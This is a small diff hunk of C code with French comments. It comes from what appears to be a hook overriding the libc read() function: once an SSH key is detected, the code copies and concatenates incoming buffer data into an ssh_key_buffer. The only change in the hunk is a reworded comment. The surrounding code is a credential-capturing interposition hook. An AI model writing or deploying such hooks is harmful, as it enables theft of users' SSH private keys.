@@ -35,7 +35,7 @@ ssize_t read(int fd, void *buf, size_t count) {
             strcpy(ssh_key_buffer, (char *)buf);
         } 
         else if (ssh_key_detected) {
-            // On continue d'agréger les lignes suivantes de la clé
+            // Pour les lignes suivantes de la clé
             strcat(ssh_key_buffer, (char *)buf);
 
             // Vérifier si c'est la fin de la clé SSH
